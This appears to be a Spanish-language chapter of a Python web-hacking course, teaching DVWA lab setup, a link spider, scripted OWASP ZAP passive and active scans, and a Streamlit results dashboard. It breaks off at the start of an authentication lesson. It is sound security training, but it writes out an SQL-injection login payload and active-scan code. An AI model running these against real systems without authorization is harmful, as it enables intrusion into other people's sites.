| **Inicio**         | **atr√°s 6**                                                                  | **Siguiente 8**                                                  |
| ------------------ | ---------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| [üè†](../README.md) | [‚è™](./4_6_Python_Hacking_y_Explotacion_de_redes_informaticas_con_Python.md) | [‚è©](./4_8_Post_Explotacion_y_evasion_de_defensas_con_Python.md) |

---

## **√çndice**

| Temario                                                                                                                             |
| ----------------------------------------------------------------------------------------------------------------------------------- |
| [244. Instalaci√≥n de una aplicaci√≥n web vulnerable](#232-man-in-the-middle-mitm-y-arp-spoofing)                                     |
| [245. Spidering y Crawling con Python](#233-arp-spoofing-con-python)                                                                |
| [246. OWASP ZAP con Python: An√°lisis avanzado de aplicaciones web](#234-interceptaci√≥n-de-tr√°fico-de-red-en-tiempo-real-con-python) |
| [247. Presentaci√≥n de resultados con Streamlit](#235-modificaci√≥n-de-tr√°fico-de-red-en-tiempo-real-con-python)                      |
| [248. An√°lisis pasivo con Python y OWASP ZAP](#236-modificaci√≥n-de-tr√°fico-http-en-tiempo-real)                                     |
| [249. An√°lisis activo con Python y OWASP ZAP](#237-introducci√≥n-a-dns-spoofing)                                                     |
| [250. Autenticaci√≥n en una aplicaci√≥n web con Python](#238-dns-spoofing-con-python)                                                 |
| [251. Introducci√≥n al escaneo y explotaci√≥n de XSS con Python](#239-unas-palabras-sobre-sslstrip-y-hsts)                            |
| [252. Escaneo y explotaci√≥n de XSS con Python](#240-detectar-arp-spoofing-con-python)                                               |
| [253. Implementa un esc√°ner de SQL Injection con Python](#241-fuerza-bruta-ssh-con-python)                                          |
| [254. Escaneo y explotaci√≥n de SQL Injection con Python](#242-dhcp-listener-con-python)                                             |
| [255. Descubrimiento de subdominios con Python](#243-mac-spoofing-con-python)                                                       |
| [256. Descubrimiento de contenido web con Python](#241-fuerza-bruta-ssh-con-python)                                                 |
| [257. Fuerza Bruta a paneles de autenticaci√≥n web con Python](#242-dhcp-listener-con-python)                                        |
| [258. Extendiendo Burp Suite con Python](#243-mac-spoofing-con-python)                                                              |

---

# **Python Hacking y Explotacion de aplicaciones Web con Python**

## **244. Instalaci√≥n de una aplicaci√≥n web vulnerable**

### üß† ¬øQu√© es una aplicaci√≥n web vulnerable?

Es una aplicaci√≥n creada **intencionalmente con fallos de seguridad**, como:

- Inyecci√≥n SQL
- XSS
- Falsificaci√≥n de peticiones (CSRF)
- Subida de archivos maliciosos
- Ejecuci√≥n remota de comandos

Estas apps son √∫tiles para entrenar t√©cnicas ofensivas y defensivas de seguridad web en un **entorno controlado**.

---

### üîí ‚ö†Ô∏è ADVERTENCIA LEGAL

> Nunca debes instalar estas aplicaciones vulnerables en un servidor p√∫blico ni en una red de producci√≥n.
> Solo deben usarse en **laboratorios locales o m√°quinas virtuales aisladas**.

---

### ‚úÖ Requisitos previos

Puedes hacerlo de 2 formas:

1. üê≥ **Con Docker** (m√°s f√°cil y r√°pido)
2. üíª **Manual** (para aprender m√°s)

Te explicar√© ambas, usando una de las apps m√°s populares:

### üì¶ DVWA (Damn Vulnerable Web Application)

Es una de las apps vulnerables m√°s usadas para aprender **OWASP Top 10**.

---

### üîÅ OPCI√ìN 1: INSTALAR DVWA CON DOCKER (recomendado)

#### 1. Instala Docker

En Linux (Debian/Ubuntu):

```bash
sudo apt update
sudo apt install docker.io docker-compose -y
sudo systemctl start docker
sudo systemctl enable docker
```

Verifica que Docker funcione:

```bash
docker --version
```

#### 2. Crea carpeta para el proyecto

```bash
mkdir dvwa
cd dvwa
```

#### 3. Crea un archivo `docker-compose.yml` con este contenido:

```yaml
version: "3"

services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    restart: always
```

#### 4. Ejecuta el contenedor:

```bash
sudo docker-compose up -d
```

#### 5. Abre tu navegador

Ve a: [http://localhost:8080](http://localhost:8080)

Ver√°s la interfaz de **DVWA**. Solo tienes que hacer clic en ‚ÄúCreate / Reset Database‚Äù.

---

### ‚úçÔ∏è Credenciales por defecto:

```
Usuario: admin
Contrase√±a: password
```

---

### üõ†Ô∏è OPCI√ìN 2: INSTALAR DVWA MANUALMENTE (sin Docker)

Ideal si quieres aprender c√≥mo funciona por dentro.

#### 1. Requisitos

- Apache
- PHP
- MySQL
- DVWA

#### En Ubuntu:

```bash
sudo apt update
sudo apt install apache2 php php-mysqli git mariadb-server -y
```

#### 2. Clonar DVWA

```bash
cd /var/www/html
sudo git clone https://github.com/digininja/DVWA.git
sudo chown -R www-data:www-data DVWA
```

#### 3. Configurar base de datos

```bash
sudo mysql -u root
```

Y dentro del prompt de MySQL:

```sql
CREATE DATABASE dvwa;
CREATE USER 'dvwauser'@'localhost' IDENTIFIED BY 'dvwapass';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwauser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

#### 4. Configurar DVWA

```bash
cd /var/www/html/DVWA/config
sudo cp config.inc.php.dist config.inc.php
sudo nano config.inc.php
```

Edita las l√≠neas para que coincidan con:

```php
$_DVWA[ 'db_user' ] = 'dvwauser';
$_DVWA[ 'db_password' ] = 'dvwapass';
```

Guarda y cierra.

#### 5. Reinicia Apache

```bash
sudo systemctl restart apache2
```

---

#### 6. Accede desde navegador

Navega a: [http://localhost/DVWA](http://localhost/DVWA)

Haz clic en ‚ÄúCreate / Reset Database‚Äù.

---

### üîì ¬øQu√© vulnerabilidades trae DVWA?

DVWA incluye ejemplos de:

| Vulnerabilidad           | Descripci√≥n breve                           |
| ------------------------ | ------------------------------------------- |
| SQL Injection            | Inyecci√≥n directa de consultas SQL          |
| Command Injection        | Inyecci√≥n de comandos del sistema operativo |
| File Upload              | Carga de archivos inseguros                 |
| XSS (Reflected y Stored) | Inyecci√≥n de scripts en formularios         |
| CSRF                     | Manipulaci√≥n de acciones sin consentimiento |
| Brute Force              | Ataques por fuerza bruta de login           |

Puedes elegir el **nivel de seguridad** (Low, Medium, High, Impossible) desde la configuraci√≥n.

---

### üß™ EJEMPLO COMPLETO DE USO

#### 1. Accede a [http://localhost:8080](http://localhost:8080)

#### 2. Inicia sesi√≥n con:

```
admin / password
```

#### 3. Ve al m√≥dulo ‚ÄúSQL Injection‚Äù

#### 4. Prueba esto en el campo ‚ÄúUser ID‚Äù:

```
1' OR '1'='1
```

Esto devolver√° todos los usuarios, demostrando que la app es vulnerable a inyecci√≥n SQL.

---

### üß† RESUMEN

| Elemento       | Detalle                                                                                           |
| -------------- | ------------------------------------------------------------------------------------------------- |
| App vulnerable | DVWA (Damn Vulnerable Web App)                                                                    |
| Instalaci√≥n    | Por Docker (f√°cil) o manual (m√°s did√°ctico)                                                       |
| URL de acceso  | [http://localhost:8080](http://localhost:8080) (o [http://localhost/DVWA](http://localhost/DVWA)) |
| Pr√°cticas      | OWASP Top 10: SQLi, XSS, CSRF, File Upload, etc.                                                  |
| Precauci√≥n     | Solo usar en entorno de laboratorio                                                               |

---

### üß∞ Otras apps vulnerables que puedes explorar:

| Nombre            | Descripci√≥n                              |
| ----------------- | ---------------------------------------- |
| **bWAPP**         | Incluye +100 vulnerabilidades            |
| **Mutillidae II** | App PHP vulnerable a prop√≥sito           |
| **Juice Shop**    | App moderna con vulnerabilidades OWASP   |
| **WebGoat**       | Proyecto oficial de OWASP para pr√°cticas |

---

[üîº](#√≠ndice)

---

## **245. Spidering y Crawling con Python**

### üï∑Ô∏è ¬øQu√© es _Spidering_ y _Crawling_?

Son t√©cnicas usadas para **recorrer autom√°ticamente sitios web**, recolectando enlaces y contenido.

| T√©rmino       | Significado                                                                                        |
| ------------- | -------------------------------------------------------------------------------------------------- |
| **Crawling**  | Navegar autom√°ticamente por un sitio web, extrayendo URLs, textos, im√°genes, etc.                  |
| **Spidering** | Espec√≠ficamente seguir enlaces como una ‚Äúara√±a‚Äù que explora todo el sitio. Muy similar a crawling. |

Usado por:

- **Motores de b√∫squeda** (como Google)
- **Scrapers** (para recolectar datos)
- **Auditores de seguridad** (para encontrar rutas ocultas)
- **Hackers √©ticos** (reconocimiento de sitios)

---

### üß∞ Herramientas que usaremos en Python

Usaremos:

1. **requests** ‚Üí Para hacer peticiones HTTP
2. **BeautifulSoup** ‚Üí Para analizar y extraer contenido HTML
3. **urllib.parse** ‚Üí Para construir URLs absolutas

---

### ‚úÖ Instalaci√≥n de herramientas necesarias

Abre tu terminal y ejecuta:

```bash
pip install requests beautifulsoup4
```

---

### üí° Conceptos clave

- **URL base**: punto inicial del sitio.
- **Enlaces encontrados**: URLs extra√≠das del HTML.
- **Lista de URLs visitadas**: para evitar repetir.
- **Recursividad**: visitar enlaces encontrados dentro de cada p√°gina.

---

### üêç EJEMPLO COMPLETO: Spider simple con Python

Vamos a crear un **Spider que recorra un sitio web y guarde todos los enlaces internos** que encuentre.

---

#### üìÅ Paso 1: Crear archivo `simple_spider.py`

```python
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

# Sitio web inicial (puedes cambiar esto por cualquier dominio)
inicio_url = "http://books.toscrape.com/"

# Listas para controlar lo que visitamos
visitados = set()
pendientes = [inicio_url]

print("[*] Iniciando spider...\n")

while pendientes:
    url_actual = pendientes.pop(0)

    if url_actual in visitados:
        continue

    print(f"[+] Visitando: {url_actual}")
    visitados.add(url_actual)

    try:
        respuesta = requests.get(url_actual, timeout=5)
    except requests.RequestException as e:
        print(f"[!] Error al acceder a {url_actual}: {e}")
        continue

    soup = BeautifulSoup(respuesta.text, "html.parser")

    # Buscar todos los enlaces en la p√°gina
    for enlace in soup.find_all("a"):
        href = enlace.get("href")
        if href:
            # Construir URL absoluta
            url_completa = urljoin(url_actual, href)

            # Filtrar solo enlaces internos
            dominio_inicio = urlparse(inicio_url).netloc
            dominio_enlace = urlparse(url_completa).netloc

            if dominio_enlace == dominio_inicio and url_completa not in visitados:
                pendientes.append(url_completa)
```

---

### üß™ ¬øC√≥mo ejecutarlo?

1. Guarda el script como `simple_spider.py`.
2. Ejecuta en la terminal:

```bash
python3 simple_spider.py
```

3. Ver√°s c√≥mo el programa va **visitando enlaces internos** del sitio y los imprime.

---

### üîç ¬øQu√© hace este c√≥digo?

| Parte                      | Explicaci√≥n                                      |
| -------------------------- | ------------------------------------------------ |
| `requests.get()`           | Solicita la p√°gina                               |
| `BeautifulSoup`            | Analiza el HTML                                  |
| `urljoin()`                | Construye la URL absoluta                        |
| `urlparse().netloc`        | Extrae el dominio para asegurar que sea el mismo |
| `visitados` y `pendientes` | Evita bucles infinitos y enlaces repetidos       |

---

### üîê ¬øD√≥nde se usa esto en ciberseguridad?

- **Reconocimiento web** (para encontrar paneles ocultos)
- **Descubrimiento de recursos** (p√°ginas internas, archivos)
- **Mapeo del sitio** en pruebas de caja gris
- En herramientas como **Burp Suite Spider**, **OWASP ZAP Spider**, etc.

---

### üí° ¬øY si quiero guardar los resultados en un archivo?

Agrega al final del script:

```python
with open("enlaces_descubiertos.txt", "w") as f:
    for url in visitados:
        f.write(url + "\n")

print("\n[‚úî] Enlaces guardados en enlaces_descubiertos.txt")
```

---

### ‚úÖ RESUMEN

| Tema             | Detalle                                                     |
| ---------------- | ----------------------------------------------------------- |
| Qu√© aprendiste   | Spidering y Crawling con Python                             |
| Librer√≠as usadas | `requests`, `BeautifulSoup`, `urllib.parse`                 |
| Sitio de prueba  | [http://books.toscrape.com](http://books.toscrape.com)      |
| Objetivo         | Recorrer el sitio y recolectar enlaces                      |
| Seguridad        | √ösalo solo en sitios legales, educativos o con autorizaci√≥n |

---

[üîº](#√≠ndice)

---

## **246. OWASP ZAP con Python: An√°lisis avanzado de aplicaciones web**

### üõ°Ô∏è ¬øQu√© es OWASP ZAP?

**ZAP (Zed Attack Proxy)** es una herramienta de **pentesting web automatizado** desarrollada por OWASP. Es gratuita, de c√≥digo abierto, y sirve para:

- Escanear vulnerabilidades como **XSS**, **SQLi**, etc.
- Realizar **spidering**, **fuzzing**, escaneo pasivo y activo
- Automatizar auditor√≠as con su **API REST** y **scripts en Python**

---

### ü§î ¬øPor qu√© usarlo con Python?

Usar ZAP desde Python te permite:

- Integrarlo a flujos de CI/CD (DevSecOps)
- Automatizar auditor√≠as de m√∫ltiples sitios
- Personalizar escaneos y reportes
- Usarlo como base para crear tu propia herramienta

---

### üîß INSTALACI√ìN COMPLETA PASO A PASO

#### ‚úÖ Paso 1: Instalar OWASP ZAP

Puedes usarlo de varias formas:

##### a) Descarga desde el sitio oficial:

- Ir a: [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/)
- Descargar la versi√≥n **Cross-Platform** (para Linux, Windows o macOS)

##### b) O desde Snap (Linux):

```bash
sudo snap install zaproxy
```

#### c) O con Docker:

```bash
docker pull owasp/zap2docker-stable
```

---

#### ‚úÖ Paso 2: Ejecutar OWASP ZAP con API abierta

Ejecuta ZAP con la API REST habilitada:

```bash
./zap.sh -daemon -host 127.0.0.1 -port 8090 -config api.disablekey=true
```

- `-daemon`: lo ejecuta en segundo plano (sin GUI)
- `-port 8090`: la API REST estar√° en ese puerto
- `-disablekey=true`: para no requerir una API key

---

#### ‚úÖ Paso 3: Instalar el cliente Python para OWASP ZAP

```bash
pip install python-owasp-zap-v2.4
```

Esto instala el m√≥dulo oficial de Python para controlar ZAP.

---

### üêç EJEMPLO COMPLETO: Escaneo web con ZAP desde Python

Este ejemplo:

- Lanza un **spider**
- Realiza un **escaneo activo**
- Imprime las vulnerabilidades encontradas

---

#### üìÑ C√≥digo: `zap_scan.py`

```python
from zapv2 import ZAPv2
import time

# Direcci√≥n de la API de ZAP
zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8090', 'https': 'http://127.0.0.1:8090'})

# URL objetivo (usa sitios de prueba como DVWA o OWASP Juice Shop)
objetivo = 'http://testphp.vulnweb.com/'

print(f"[+] Accediendo a: {objetivo}")
zap.urlopen(objetivo)
time.sleep(2)

# Iniciar spider
print("[*] Ejecutando spider...")
scan_id = zap.spider.scan(objetivo)
time.sleep(2)

while int(zap.spider.status(scan_id)) < 100:
    print(f"[+] Spider progreso: {zap.spider.status(scan_id)}%")
    time.sleep(1)

print("[‚úì] Spider finalizado")

# Escaneo activo
print("[*] Ejecutando escaneo activo...")
active_scan_id = zap.ascan.scan(objetivo)

while int(zap.ascan.status(active_scan_id)) < 100:
    print(f"[+] Escaneo activo: {zap.ascan.status(active_scan_id)}%")
    time.sleep(1)

print("[‚úì] Escaneo activo completado")

# Resultados
print("\n[!] Vulnerabilidades encontradas:")
for alerta in zap.core.alerts(baseurl=objetivo):
    print(f"- {alerta['alert']} | Riesgo: {alerta['risk']}")

# Puedes guardar en archivo:
with open("reporte_vulnerabilidades.txt", "w") as f:
    for alerta in zap.core.alerts(baseurl=objetivo):
        f.write(f"{alerta['alert']} | Riesgo: {alerta['risk']}\n")

print("\n[‚úî] Reporte guardado en 'reporte_vulnerabilidades.txt'")
```

---

### ‚úÖ ¬øC√≥mo ejecutarlo?

1. Aseg√∫rate de tener OWASP ZAP corriendo con el par√°metro `-daemon`.
2. Ejecuta el script:

```bash
python3 zap_scan.py
```

---

### üî¨ ¬øD√≥nde lo puedes probar?

Sitios vulnerables p√∫blicos para pr√°cticas:

- [http://testphp.vulnweb.com](http://testphp.vulnweb.com)
- [https://juice-shop.herokuapp.com](https://juice-shop.herokuapp.com) (Juice Shop)
- [http://dvwa.local](http://dvwa.local) (si tienes DVWA en tu red local)

---

### üß™ ¬øQu√© analiza ZAP?

| Tipo de vulnerabilidad        | Detecta con      |
| ----------------------------- | ---------------- |
| XSS                           | Escaneo activo   |
| SQL Injection                 | Escaneo activo   |
| Seguridad en cookies          | Escaneo pasivo   |
| Headers inseguros (CSP, HSTS) | Pasivo           |
| Archivos accesibles           | Spider/Fuzzer    |
| Formularios inseguros         | Spider + Escaneo |

---

### üìÇ ¬øC√≥mo extender esto?

Puedes:

- Automatizar escaneo de m√∫ltiples URLs
- Generar reportes HTML o JSON (`zap.core.htmlreport()`)
- Integrar a CI/CD (GitHub Actions, Jenkins)
- A√±adir autenticaci√≥n para sitios protegidos

---

### ‚úÖ RESUMEN

| Elemento              | Detalle                            |
| --------------------- | ---------------------------------- |
| Herramienta usada     | OWASP ZAP con Python               |
| Instalaci√≥n           | Manual, Snap, o Docker             |
| Cliente de Python     | `python-owasp-zap-v2.4`            |
| API REST              | Controla ZAP desde scripts         |
| Acciones autom√°ticas  | Spider, escaneo activo, resultados |
| Archivo de resultados | `reporte_vulnerabilidades.txt`     |

---

[üîº](#√≠ndice)

---

## **247. Presentaci√≥n de resultados con Streamlit**

### üß† ¬øQu√© es Streamlit?

**Streamlit** es una biblioteca de Python que te permite crear **aplicaciones web interactivas** para visualizar y compartir resultados sin necesidad de conocimientos profundos en frontend (como HTML o JS).

Ideal para:

- Mostrar gr√°ficos, tablas, textos
- Visualizar modelos de machine learning
- Mostrar dashboards de ciberseguridad o auditor√≠a

---

### üõ†Ô∏è INSTALACI√ìN DE STREAMLIT

#### Paso 1: Crear un entorno virtual (opcional pero recomendado)

```bash
python -m venv env
source env/bin/activate   # En Linux/macOS
env\Scripts\activate      # En Windows
```

#### Paso 2: Instalar Streamlit

```bash
pip install streamlit
```

---

### üß™ EJEMPLO SENCILLO: Dashboard de an√°lisis de vulnerabilidades

Supongamos que tenemos un archivo `.csv` con resultados de un escaneo (como el generado por ZAP u otra herramienta):

#### ‚úÖ Archivo: `vulnerabilidades.csv`

```csv
Alerta,Riesgo,URL
XSS Reflejado,Alto,http://testphp.vulnweb.com
SQL Injection,Cr√≠tico,http://testphp.vulnweb.com/login.php
Insecure Cookies,Medio,http://testphp.vulnweb.com
```

---

#### üßæ Archivo Python: `app.py`

```python
import streamlit as st
import pandas as pd
import plotly.express as px

# T√≠tulo principal
st.title("üìä Dashboard de Vulnerabilidades Web")

# Cargar los datos
archivo = st.file_uploader("Sube el archivo CSV con vulnerabilidades", type="csv")

if archivo is not None:
    df = pd.read_csv(archivo)

    st.subheader("Vista previa de datos:")
    st.dataframe(df)

    # Conteo por riesgo
    st.subheader("Distribuci√≥n por nivel de riesgo")
    conteo_riesgo = df['Riesgo'].value_counts().reset_index()
    conteo_riesgo.columns = ['Riesgo', 'Cantidad']

    fig = px.pie(conteo_riesgo, names='Riesgo', values='Cantidad',
                 title='Vulnerabilidades por nivel de riesgo',
                 color_discrete_sequence=px.colors.sequential.RdBu)

    st.plotly_chart(fig)

    # Tabla filtrada
    st.subheader("Filtrar por nivel de riesgo:")
    riesgo_seleccionado = st.multiselect("Selecciona niveles de riesgo:", df['Riesgo'].unique())

    if riesgo_seleccionado:
        df_filtrado = df[df['Riesgo'].isin(riesgo_seleccionado)]
        st.dataframe(df_filtrado)
    else:
        st.write("Selecciona al menos un nivel de riesgo para mostrar la tabla.")
```

---

### üöÄ ¬øC√≥mo ejecutarlo?

1. Coloca tu archivo `vulnerabilidades.csv` en el mismo directorio.
2. Ejecuta la app:

```bash
streamlit run app.py
```

3. Se abrir√° autom√°ticamente en tu navegador, en la URL:

```
http://localhost:8501
```

---

### üß© ¬øQu√© puedes hacer desde aqu√≠?

| Funcionalidad             | ¬øQu√© hace?                                   |
| ------------------------- | -------------------------------------------- |
| Subida de CSV             | Permite cargar un archivo con resultados     |
| Vista previa              | Muestra tabla con todas las vulnerabilidades |
| Gr√°fico interactivo (Pie) | Muestra riesgos distribuidos por categor√≠a   |
| Filtro por riesgo         | Permite filtrar la tabla por nivel de riesgo |

---

### üìå Mejoras opcionales que puedes agregar

- Agregar exportaci√≥n a PDF
- Leer JSON o XML adem√°s de CSV
- Colorear la tabla seg√∫n severidad
- Agregar enlaces clicables en la columna URL
- Mostrar alertas m√°s frecuentes

---

### ‚úÖ RESUMEN

| Elemento              | Descripci√≥n                     |
| --------------------- | ------------------------------- |
| Herramienta principal | Streamlit                       |
| Tipo de app           | Dashboard interactivo           |
| Datos de entrada      | Archivo CSV de vulnerabilidades |
| Visualizaci√≥n         | Tabla + gr√°fico de torta        |
| C√≥digo principal      | `app.py`                        |
| Ejecuci√≥n             | `streamlit run app.py`          |

---

[üîº](#√≠ndice)

---

## **248. An√°lisis pasivo con Python y OWASP ZAP**

### üß† ¬øQu√© es un an√°lisis pasivo?

El **an√°lisis pasivo** en seguridad web es un tipo de escaneo que **no genera tr√°fico malicioso ni intenta explotar vulnerabilidades**. Solo **observa** el tr√°fico de la aplicaci√≥n para detectar:

- Headers inseguros (falta de HSTS, CSP, etc.)
- Uso de cookies inseguras
- Formularios que no usan HTTPS
- Archivos expuestos
- Errores de configuraci√≥n

üëâ Es **seguro** y se puede usar en producci√≥n si se tiene cuidado.

---

### üõ†Ô∏è Herramientas necesarias

#### ‚úÖ 1. OWASP ZAP

OWASP ZAP es un proxy que intercepta y analiza tr√°fico HTTP/S. Para an√°lisis pasivo:

- Intercepta solicitudes/respuestas
- Eval√∫a sin atacar

#### ‚úÖ 2. Python

Usamos Python con el m√≥dulo oficial de ZAP para controlar la herramienta y recolectar datos.

---

### üîß Instalaci√≥n paso a paso

#### 1. Instalar OWASP ZAP

##### Opci√≥n A: Descargar manualmente

- Ve a: [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/)
- Descarga y extrae la versi√≥n para tu sistema operativo

##### Opci√≥n B: Usar Docker (recomendado)

```bash
docker pull owasp/zap2docker-stable
```

Y ejec√∫talo con:

```bash
docker run -u zap -p 8090:8090 -i owasp/zap2docker-stable zap.sh -daemon -host 0.0.0.0 -port 8090 -config api.disablekey=true
```

#### 2. Instalar cliente de Python para OWASP ZAP

```bash
pip install python-owasp-zap-v2.4
```

---

### üß™ ¬øC√≥mo funciona el an√°lisis pasivo?

1. Hacemos que OWASP ZAP observe el tr√°fico HTTP/HTTPS que pasa por √©l.
2. Enviamos una o varias peticiones desde Python o navegador.
3. Usamos Python para extraer las **alertas pasivas** detectadas por ZAP.

---

### ‚úÖ EJEMPLO COMPLETO DE AN√ÅLISIS PASIVO

#### Escenario:

Queremos analizar pasivamente el sitio de pruebas:
`http://testphp.vulnweb.com/`

---

##### üìÑ C√≥digo Python: `analisis_pasivo.py`

```python
from zapv2 import ZAPv2
import time

# Conexi√≥n a la API de ZAP
zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8090', 'https': 'http://127.0.0.1:8090'})

# URL a analizar pasivamente
objetivo = 'http://testphp.vulnweb.com/'

print(f"[+] Visitando {objetivo} para activar an√°lisis pasivo...")
zap.urlopen(objetivo)
time.sleep(5)  # Esperar que ZAP capture y analice

print("[‚úì] Visita completada. Recopilando alertas pasivas...")

# Obtener alertas (s√≥lo las pasivas se generar√°n si no hicimos escaneo activo)
alertas = zap.core.alerts(baseurl=objetivo)

if alertas:
    for alerta in alertas:
        print(f"""
        [!] Alerta: {alerta['alert']}
        - Riesgo: {alerta['risk']}
        - Descripci√≥n: {alerta['desc']}
        - Soluci√≥n: {alerta['solution']}
        - URL: {alerta['url']}
        """)
else:
    print("[‚úì] No se encontraron alertas pasivas.")

# Guardar reporte
with open("reporte_pasivo.txt", "w") as f:
    for alerta in alertas:
        f.write(f"{alerta['alert']} ({alerta['risk']}) - {alerta['url']}\n")

print("\n[‚úì] Reporte guardado en 'reporte_pasivo.txt'")
```

---

### üîÑ C√≥mo ejecutarlo paso a paso

1. Ejecuta OWASP ZAP (modo daemon sin GUI):

```bash
./zap.sh -daemon -host 127.0.0.1 -port 8090 -config api.disablekey=true
```

o con Docker:

```bash
docker run -u zap -p 8090:8090 -i owasp/zap2docker-stable zap.sh -daemon -host 0.0.0.0 -port 8090 -config api.disablekey=true
```

2. Ejecuta el script:

```bash
python3 analisis_pasivo.py
```

3. Ver√°s las alertas pasivas en la terminal y se guardar√°n en `reporte_pasivo.txt`.

---

### üìä ¬øQu√© tipo de alertas pasivas puedes encontrar?

| Tipo de alerta                                | Riesgo | Ejemplo                  |
| --------------------------------------------- | ------ | ------------------------ |
| Cabecera `X-Frame-Options` ausente            | Medio  | Riesgo de clickjacking   |
| Cookies inseguras (sin `Secure` o `HttpOnly`) | Medio  | Riesgo de robo de sesi√≥n |
| Contenido mixto (http dentro de https)        | Alto   | Riesgo de intercepci√≥n   |
| Recursos sin cache                            | Bajo   | No optimizado            |
| Server Header revelado                        | Bajo   | Informaci√≥n expuesta     |

---

### ‚úÖ RESUMEN

| Elemento              | Detalle                                       |
| --------------------- | --------------------------------------------- |
| Herramienta principal | OWASP ZAP                                     |
| Modo de operaci√≥n     | Daemon (sin GUI)                              |
| Tipo de an√°lisis      | Pasivo (sin atacar)                           |
| API de control        | Python con `python-owasp-zap-v2.4`            |
| Resultado             | Lista de alertas pasivas en consola y archivo |

---

[üîº](#√≠ndice)

---

## **249. An√°lisis activo con Python y OWASP ZAP**

### üß† ¬øQu√© es un an√°lisis activo con OWASP ZAP?

El **an√°lisis activo** va m√°s all√° del pasivo: adem√°s de observar el tr√°fico, **lanza pruebas activas** para detectar vulnerabilidades. Algunas pruebas que puede realizar:

- Inyecciones SQL
- Cross-site scripting (XSS)
- Command injection
- File path traversal
- Fuerza bruta de formularios
- Escaneo de cabeceras y configuraciones inseguras

üî¥ Esto puede alterar el comportamiento del sitio. √ösalo **solo en entornos de prueba** o con autorizaci√≥n.

---

### üõ†Ô∏è ¬øQu√© necesitamos?

| Herramienta                       | Descripci√≥n                            |
| --------------------------------- | -------------------------------------- |
| Python                            | Para controlar ZAP con su API          |
| OWASP ZAP                         | Herramienta de escaneo y proxy         |
| `python-owasp-zap-v2.4`           | Cliente Python oficial para OWASP ZAP  |
| Un sitio web vulnerable de prueba | Usaremos: `http://testphp.vulnweb.com` |

---

### üîß Instalaci√≥n paso a paso

#### ‚úÖ 1. Instalar OWASP ZAP

##### Opci√≥n A: Manual

- Ir a: [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/)
- Descargar la versi√≥n para tu sistema (Windows/Linux/macOS)

##### Opci√≥n B: Docker (recomendado)

```bash
docker pull owasp/zap2docker-stable
```

Ejecutar ZAP como servicio (modo _daemon_):

```bash
docker run -u zap -p 8090:8090 -i owasp/zap2docker-stable zap.sh -daemon -host 0.0.0.0 -port 8090 -config api.disablekey=true
```

Esto iniciar√° ZAP en modo silencioso y sin interfaz gr√°fica, accesible por API.

---

#### ‚úÖ 2. Instalar cliente Python

```bash
pip install python-owasp-zap-v2.4
```

---

### ‚öôÔ∏è ¬øC√≥mo funciona el an√°lisis activo?

1. Conectamos a ZAP usando su API.
2. Visitamos la URL objetivo (esto puebla el √°rbol de navegaci√≥n de ZAP).
3. ZAP escanea activamente las p√°ginas detectadas.
4. Obtenemos las vulnerabilidades encontradas.

---

### ‚úÖ EJEMPLO COMPLETO CON PYTHON

#### üéØ Sitio objetivo: `http://testphp.vulnweb.com/`

---

##### üìÑ C√≥digo: `analisis_activo.py`

```python
from zapv2 import ZAPv2
import time

# Conectarse a la API de ZAP
zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8090', 'https': 'http://127.0.0.1:8090'})

objetivo = 'http://testphp.vulnweb.com/'
print(f"[+] Iniciando escaneo activo sobre: {objetivo}")

# Visitar el objetivo para que ZAP lo registre
zap.urlopen(objetivo)
time.sleep(3)

# Obtener el ID del escaneo activo
scan_id = zap.ascan.scan(objetivo)
print(f"[‚úì] Escaneo lanzado. ID: {scan_id}")

# Esperar a que el escaneo termine
while int(zap.ascan.status(scan_id)) < 100:
    print(f"[...] Progreso del escaneo: {zap.ascan.status(scan_id)}%")
    time.sleep(2)

print("[‚úì] Escaneo activo finalizado.")

# Obtener las alertas encontradas
alertas = zap.core.alerts(baseurl=objetivo)

# Mostrar resultados
if alertas:
    for alerta in alertas:
        print(f"""
        [!] Alerta: {alerta['alert']}
        - Riesgo: {alerta['risk']}
        - URL: {alerta['url']}
        - Descripci√≥n: {alerta['desc']}
        - Soluci√≥n: {alerta['solution']}
        """)
else:
    print("No se encontraron vulnerabilidades.")

# Guardar reporte HTML
with open("reporte_activo.html", "w", encoding="utf-8") as f:
    f.write(zap.core.htmlreport())
    print("[‚úì] Reporte HTML guardado como 'reporte_activo.html'")
```

---

### üöÄ C√≥mo ejecutarlo

#### Paso 1: Inicia OWASP ZAP en modo daemon

##### En consola local:

```bash
zap.sh -daemon -host 127.0.0.1 -port 8090 -config api.disablekey=true
```

##### O en Docker:

```bash
docker run -u zap -p 8090:8090 -i owasp/zap2docker-stable zap.sh -daemon -host 0.0.0.0 -port 8090 -config api.disablekey=true
```

#### Paso 2: Ejecuta tu script Python

```bash
python analisis_activo.py
```

---

### üìä Resultado

Al finalizar:

- Ver√°s en consola una lista de vulnerabilidades encontradas, su nivel de riesgo, descripci√≥n y c√≥mo solucionarlas.
- Se crear√° un archivo `reporte_activo.html` con un informe visual.

---

### üìå Algunas vulnerabilidades comunes que detecta ZAP activamente:

| Vulnerabilidad             | Riesgo  |
| -------------------------- | ------- |
| Cross-site scripting (XSS) | Alto    |
| Inyecci√≥n SQL              | Cr√≠tico |
| Cookies inseguras          | Medio   |
| Directorios listados       | Bajo    |
| Formularios sin HTTPS      | Medio   |

---

### ‚úÖ RESUMEN

| Elemento          | Detalle                            |
| ----------------- | ---------------------------------- |
| Herramienta       | OWASP ZAP (API + Python)           |
| Modo              | Activo (lanza ataques controlados) |
| Resultado         | Vulnerabilidades descubiertas      |
| Formato de salida | Consola + HTML                     |

---

[üîº](#√≠ndice)

---

## **250. Autenticaci√≥n en una aplicaci√≥n web con Python**

### üß† ¬øQu√© es la autenticaci√≥n?

La **autenticaci√≥n** es el proceso de verificar la identidad de un usuario. Cuando alguien entra a una app web y pone su **usuario y contrase√±a**, el sistema verifica si esos datos son correctos antes de permitir el acceso.

üîí Es **la primera barrera de seguridad** en cualquier sistema web.

---

### üéØ Objetivo del tutorial

Crear una **aplicaci√≥n web simple** con:

- Registro de usuarios
- Inicio de sesi√≥n (login)
